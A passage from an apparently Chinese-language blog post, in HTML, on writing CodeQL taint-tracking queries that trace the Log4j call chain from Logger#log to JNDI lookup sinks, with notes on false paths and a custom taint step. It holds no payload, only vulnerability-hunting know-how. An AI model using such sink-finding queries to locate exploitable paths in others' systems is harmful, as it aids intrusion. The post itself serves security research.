punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"InitialContext"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>         this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiTemplate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiLocatorDelegate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.shiro.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiLocatorDelegate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiTemplate"</span><span class="token punctuation">)</span>    }}class Logger extends  RefType{    Logger<span class="token punctuation">(</span><span class="token punctuation">)</span>{        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.spi"</span><span class="token punctuation">,</span> <span class="token string">"AbstractLogger"</span><span class="token punctuation">)</span>    }}class LoggerInput extends  Method {    LoggerInput<span class="token punctuation">(</span><span class="token punctuation">)</span>{        this<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Logger <span class="token operator">and</span>        this<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span> <span class="token operator">and</span> this<span class="token punctuation">.</span>getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>    }    Parameter getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> }}predicate isLookup<span class="token punctuation">(</span>Expr arg<span class="token punctuation">)</span> {    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span>        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"lookup"</span>        <span class="token operator">and</span>        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Context        <span class="token operator">and</span>        arg <span class="token operator">=</span> ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>}class TainttrackLookup  extends TaintTracking::Configuration {    TainttrackLookup<span class="token punctuation">(</span><span class="token punctuation">)</span> {         this <span class="token operator">=</span> <span class="token string">"TainttrackLookup"</span>     }    override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {        <span class="token keyword">exists</span><span class="token punctuation">(</span>            LoggerInput loggermethod <span class="token operator">|</span>             source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> loggermethod<span class="token punctuation">.</span>getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    }    override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> {        <span class="token keyword">exists</span><span class="token punctuation">(</span>Expr arg <span class="token operator">|</span>            isLookup<span class="token punctuation">(</span>arg<span class="token punctuation">)</span>            <span class="token operator">and</span>            sink<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> arg        <span class="token punctuation">)</span>    }} <span class="token keyword">from</span> TainttrackLookup config <span class="token punctuation">,</span> DataFlow::PathNode source<span class="token punctuation">,</span> DataFlow::PathNode sink<span class="token keyword">where</span>    config<span class="token punctuation">.</span>hasFlowPath<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span><span class="token keyword">select</span> sink<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"unsafe lookup"</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this is user input"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的ql查询语句中，我们使用了标准的污点分析结构。定义<code>TainttrackLookup</code>继承<code>TaintTracking::Configuration</code>，并且在其中定义<code>isSource</code>和<code>isSink</code>，在查询语句中将<code>TainttrackLookup</code>实例化为<code>config</code>，定义数据流<code>DataFlow::PathNode source</code>和<code>DataFlow::PathNode sink</code>，使用<code>config.hasFlowPath(source, sink)</code>进行污点追踪，查询数据流是否可以从<code>sink</code>到<code>source</code>。结果：</p><p><img src="https://s2.loli.net/2022/07/11/cAdlHU3iozCgrLM.png" alt="image-20220621142035627"></p><h3 id="人工排查"><a href="#人工排查" class="headerlink" title="人工排查"></a>人工排查</h3><p>这里获得了四个Path，其中三个都走到了<code>java\org\apache\logging\log4j\core\Logger.java</code></p><p><img src="https://s2.loli.net/2022/07/11/Xdbq6t1hJncOU3G.png" alt="image-20220622102329069"></p><p>codeql选择了<code>java\org\apache\logging\log4j\core\Logger.java</code>中对<code>filter</code>方法的调用来构造gadget。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Level</span> level<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Marker</span> marker<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Message</span> msg<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token class-name">Filter</span> filter <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>filter <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> <span class="token class-name">Filter<span class="token punctuation">.</span>Result</span> r <span class="token operator">=</span> filter<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>logger<span class="token punctuation">,</span> level<span class="token punctuation">,</span> marker<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token class-name">Filter<span class="token punctuation">.</span>Result</span><span class="token punctuation">.</span>NEUTRAL<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> r <span class="token operator">==</span> <span class="token class-name">Filter<span class="token punctuation">.</span>Result</span><span class="token punctuation">.</span>ACCEPT<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> level <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> intLevel <span class="token operator">&gt;=</span> level<span class="token punctuation">.</span><span class="token function">intLevel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就能体现出静态代码分析的缺陷：对于相对复杂的项目进行分析时，关于条件判断后的代码是否可以进入判断不准确。这里挂一张南京大学《软件分析》课程的ppt（来一起卷<a href="https://www.bilibili.com/video/BV1b7411K7P4%EF%BC%89%EF%BC%8C%E5%AF%B9%E4%BA%8E%E7%8E%B0%E9%98%B6%E6%AE%B5%E7%9A%84codeql%E6%9D%A5%E8%AF%B4%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B8%8C%E6%9C%9B%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E7%9A%84%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E4%B8%AD%E7%9A%84%E7%BB%93%E6%9E%9C%E5%8C%85%E5%90%AB%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E7%9A%84truth%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%89%8D%E6%8F%90%E4%B8%8B%E5%B0%BD%E5%8F%AF%E8%83%BD%E7%BC%A9%E5%B0%8F%E7%BB%93%E6%9E%9C%E9%9B%86%E5%90%88%EF%BC%8C%E5%87%8F%E8%BD%BB%E4%BA%BA%E5%B7%A5%E6%8E%92%E6%9F%A5%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%90%E6%9C%AC%E3%80%82">https://www.bilibili.com/video/BV1b7411K7P4），对于现阶段的codeql来说，我们希望自己编写的污点分析查询语句中的结果包含我们想要的truth，在这个前提下尽可能缩小结果集合，减轻人工排查的时间成本。</a></p><p><img src="https://s2.loli.net/2022/07/11/mUI6K7yBc21OTkp.png" alt="image-20220622105238705"></p><p>回到vscode中，这个<code>filter</code>想要进入需要满足<code>Filter</code>为<code>RegexFilter</code>。因为我们的目的是寻找完整的log4j调用链，先不去想如何满足这个已知与log4j漏洞无关的条件。于是我们去查看仅剩的那条链：</p><p><img src="https://s2.loli.net/2022/07/11/Neouk7Svw8xQAir.png" alt="image-20220622111111913"></p><p>可以看到，从<code>source</code>开始直到<code>java\org\apache\logging\log4j\spi\AbstractLogger.java#tryLogMessage</code>都是准确的调用链，但是在调用log方法的时候出现了跑偏，走到了<code>AbstractLogger#log</code>。实际动手调过<code>log4j</code>漏洞的uu们肯定会记得，这里实际上是走到了<code>Logger#log</code>。这两个类之间一看就是继承关系。想解决这个问题我们可以改一下ql查询语句，将<code>source</code>设定为<code>Logger#log</code></p><p>修改一下<code>LoggerInput</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class Logger2 extends RefType {    Logger2<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core"</span><span class="token punctuation">,</span> <span class="token string">"Logger"</span><span class="token punctuation">)</span>    }}class LoggerInput extends  Method {    LoggerInput<span class="token punctuation">(</span><span class="token punctuation">)</span>{        this<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Logger2 <span class="token operator">and</span>        this<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span>    }    Parameter getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查询结果中也是有很多path，我们看一下和log4j调用链匹配度最高的：</p><p><img src="https://s2.loli.net/2022/07/11/iEYhq7olmdfJNsu.png" alt="image-20220622155227724"></p><p>此时的codeql已经能分析到<code>createEvent</code>方法。但是继续分析得到的利用链就出现了问题。没有分析成功。在<code>createEvent</code>方法中，message参数对应的是<code>logEvent</code>，在对<code>logEvent</code>进行处理时触发漏洞。我们猜测，codeql并没有将返回的<code>logEvent</code>作为污点继续分析，所以进行手动连接：</p><h3 id="isAdditionalTaintStep"><a href="#isAdditionalTaintStep" class="headerlink" title="isAdditionalTaintStep"></a>isAdditionalTaintStep</h3><p><img src="https://s2.loli.net/2022/07/11/Mh1KS3rugTwUR8Z.png" alt="image-20220622161132765"></p><p>当我们需要将某个污点传递到指定位置从而构造更准确的gadget时，可以override谓词<code>isAdditionalTaintStep</code>来实现。</p><p>分析一下现在的情况：我们需要将<code>ReusableLogEventFactory#createEvent</code>的第六个参数<code>Message</code>和<code>LoggerConfig#log</code>第一个参数<code>logEvent</code>连接起来。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">override predicate isAdditionalTaintStep<span class="token punctuation">(</span>DataFlow::Node fromNode<span class="token punctuation">,</span> DataFlow::Node toNode<span class="token punctuation">)</span> {    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma<span class="token punctuation">,</span>MethodAccess ma2 <span class="token operator">|</span>                   <span class="token comment">//set fromNode</span>        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.impl"</span><span class="token punctuation">,</span> <span class="token string">"ReusableLogEventFactory"</span><span class="token punctuation">)</span>         <span class="token operator">and</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"createEvent"</span><span class="token punctuation">)</span>         <span class="token operator">and</span> fromNode<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                    <span class="token comment">//set toNode</span>        <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.config"</span><span class="token punctuation">,</span> <span class="token string">"LoggerConfig"</span><span class="token punctuation">)</span>          <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span>         <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"logEvent"</span>        <span class="token operator">and</span> toNode<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>ma2<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>快速查询可以看到我们的<code>fromNode</code>和<code>toNode</code>设置的没有问题</p><p><img src="https://s2.loli.net/2022/07/11/8zEjmkXhv1qdUKT.png" alt="image-20220623155307405"></p><h3 id="最后结果"><a href="#最后结果" class="headerlink" title="最后结果"></a>最后结果</h3><p>完整ql查询语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/** *@name Tainttrack Context lookup *@kind path-problem */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> DataFlow::PathGraphclass Context extends  RefType{    Context<span class="token punctuation">(</span><span class="token punctuation">)</span>{        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"InitialContext"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>         this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiTemplate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiLocatorDelegate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.shiro.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiLocatorDelegate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiTemplate"</span><span class="token punctuation">)</span>    }}class Logger extends  RefType{    Logger<span class="token punctuation">(</span><span class="token punctuation">)</span>{        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.spi"</span><span class="token punctuation">,</span> <span class="token string">"AbstractLogger"</span><span class="token punctuation">)</span>    }}class Logger2 extends RefType {    Logger2<span class="token punctuation">(</span><span class="token punctuation">)</span> {        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core"</span><span class="token punctuation">,</span> <span class="token string">"Logger"</span><span class="token punctuation">)</span>    }}class LoggerInput extends  Method {    LoggerInput<span class="token punctuation">(</span><span class="token punctuation">)</span>{        this<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Logger2 <span class="token operator">and</span>        this<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span>    }    Parameter getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> }}predicate isLookup<span class="token punctuation">(</span>Expr arg<span class="token punctuation">)</span> {    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span>        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"lookup"</span>        <span class="token operator">and</span>        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Context        <span class="token operator">and</span>        arg <span class="token operator">=</span> ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>}class TainttrackLookup  extends TaintTracking::Configuration {    TainttrackLookup<span class="token punctuation">(</span><span class="token punctuation">)</span> {         this <span class="token operator">=</span> <span class="token string">"TainttrackLookup"</span>     }    override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {        <span class="token keyword">exists</span><span class="token punctuation">(</span>LoggerInput loggermethod <span class="token operator">|</span>            source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> loggermethod<span class="token punctuation">.</span>getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    }    override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> {        <span class="token keyword">exists</span><span class="token punctuation">(</span>Expr arg <span class="token operator">|</span>            isLookup<span class="token punctuation">(</span>arg<span class="token punctuation">)</span>            <span class="token operator">and</span>            sink<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> arg        <span class="token punctuation">)</span>    }    override predicate isAdditionalTaintStep<span class="token punctuation">(</span>DataFlow::Node fromNode<span class="token punctuation">,</span> DataFlow::Node toNode<span class="token punctuation">)</span> {        <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma<span class="token punctuation">,</span>MethodAccess ma2 <span class="token operator">|</span>            <span class="token comment">//set fromNode</span>            ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.impl"</span><span class="token punctuation">,</span> <span class="token string">"ReusableLogEventFactory"</span><span class="token punctuation">)</span>             <span class="token operator">and</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"createEvent"</span><span class="token punctuation">)</span>             <span class="token operator">and</span> fromNode<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>             <span class="token comment">//set toNode</span>            <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.config"</span><span class="token punctuation">,</span> <span class="token string">"LoggerConfig"</span><span class="token punctuation">)</span>              <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span>             <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"logEvent"</span>            <span class="token operator">and</span> toNode<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>ma2<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    }} <span class="token keyword">from</span> TainttrackLookup config <span class="token punctuation">,</span> DataFlow::PathNode source<span class="token punctuation">,</span> DataFlow::PathNode sink<span class="token keyword">where</span>    config<span class="token punctuation">.</span>hasFlowPath<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span><span class="token keyword">select</span> sink<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"unsafe lookup"</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this is user input"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/11/7ejs8RnATl2YtaD.png" alt="image-20220623160056489"></p><p>前面的调用链几乎分析地差不多了，但仍存在一个错误：</p><blockquote><p>原调用链的log方法会走到到<code>org/apache/logging/log4j/core/config/DefaultReliabilityStrategy.log</code>下，而此处codeql却分析到了<code>org\apache\logging\log4j\core\config\AwaitUnconditionallyReliabilityStrategy.java</code>（windows路径反斜杠是世界上最反人类的设计）。这两个类都继承自<code>ReliabilityStrategy</code> <code>LocationAwareReliabilityStrategy</code></p></blockquote><p>除去此错误，大部分调用链和原漏洞调试结果一样</p><p>reference(where my code copy from):</p><p><a href="https://github.com/ASTTeam/CodeQL">https://github.com/ASTTeam/CodeQL</a> 国内比较全的codeql相关资源总结</p><h2 id="嫖来的规则实例"><a href="#嫖来的规则实例" class="headerlink" title="嫖来的规则实例"></a>嫖来的规则实例</h2><h3 id="isSource"><a href="#isSource" class="headerlink" title="isSource"></a>isSource</h3><h4 id="以某个方法的参数作为source"><a href="#以某个方法的参数作为source" class="headerlink" title="以某个方法的参数作为source"></a>以某个方法的参数作为source</h4><p>添加了几种过滤方式，第一个参数、该方法当前类的全限定名为xxxx</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {    <span class="token keyword">exists</span><span class="token punctuation">(</span>Parameter p <span class="token operator">|</span>        p<span class="token punctuation">.</span>getCallable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"readValue"</span><span class="token punctuation">)</span> <span class="token operator">and</span>        source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> p <span class="token operator">and</span>        source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getPosition<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>        <span class="token operator">and</span> p<span class="token punctuation">.</span>getCallable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"com.service.impl"</span><span class="token punctuation">,</span> <span class="token string">"xxxxx"</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="以某个实例的所有参数作为source"><a href="#以某个实例的所有参数作为source" class="headerlink" title="以某个实例的所有参数作为source"></a>以某个实例的所有参数作为source</h4><p>(<code>X1 x1 = new X1(a,b)</code>，这里a、b作为source)，过滤：调用该实例的方法名称为<code>Caller</code>，实例类型名称为<code>X1</code></p><pre 